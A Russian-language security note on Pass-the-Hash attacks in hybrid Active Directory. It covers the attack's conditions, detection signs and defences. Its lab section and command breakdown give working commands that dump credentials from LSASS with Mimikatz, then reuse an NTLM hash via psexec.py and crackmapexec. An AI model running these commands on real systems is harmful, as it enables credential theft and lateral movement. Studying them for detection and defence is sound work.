# Pass-the-Hash (Updated for 2025)

**Источник:** US Cloud, June 2025  
**Новизна в 2025:** Обход MFA в гибридных AD-средах, использование NTLM-хэшей для аутентификации в облаке через on-premises ресурсы.

---

## 🎯 Цель атаки
Выполнять аутентификацию в системах без знания пароля, используя NTLM-хэш, что позволяет перемещаться по сети и выполнять команды.

## 📋 Описание
Pass-the-Hash (PtH) — техника, при которой атакующий использует хэш NTLM как пароль для аутентификации в Windows и службах, поддерживающих NTLM.  
В гибридных средах 2025 года возможен обход MFA при доступе через локальные системы, которые синхронизированы с облаком.

## ⚠ Условия эксплуатации
- NTLM включён в среде.
- Доступ к NTLM-хэшам пользователей или администраторов.
- Службы, принимающие NTLM, не требуют дополнительных факторов.

## 🔹 Пошагово в лаборатории
> ⚠ Только в тестовой среде!

1. Получить NTLM-хэш (пример с Mimikatz):
```powershell
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
```
2. Использовать хэш с psexec.py:
```bash
psexec.py DOMAIN/user@target -hashes :<NTLM_HASH>
```
3. Использовать хэш для SMB или WinRM доступа:
```bash
crackmapexec smb target -u user -H <NTLM_HASH>
```

## 📊 Признаки в логах и мониторинг
- Event ID 4624 (Logon Type 3, 9) от нетипичных IP.
- Сессии SMB/WinRM с учётками, которые не вводили пароль.
- Необычные последовательности входов в гибридных средах.

## 🛡 Меры защиты
- Запретить NTLM, использовать Kerberos.
- Включить SMB/LDAP signing.
- Изолировать учетные записи администраторов.
- Контролировать входы с аутентификацией по хэшу.

## 🔗 Источники
- US Cloud, June 2025 — PtH in Hybrid AD

---

## 🔍 Разбор команд

### 1. Извлечение NTLM-хэшей Mimikatz
```powershell
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
```
- **`privilege::debug`** — привилегии для доступа к LSASS.
- **`sekurlsa::logonpasswords`** — извлекает пароли и хэши.

### 2. psexec.py с NTLM-хэшем
```bash
psexec.py DOMAIN/user@target -hashes :<NTLM_HASH>
```
- **`-hashes`** — указание LM:NTLM хэшей (LM можно оставить пустым).

### 3. CrackMapExec SMB доступ
```bash
crackmapexec smb target -u user -H <NTLM_HASH>
```
- **`-H`** — NTLM-хэш.
- Использует SMB для аутентификации.
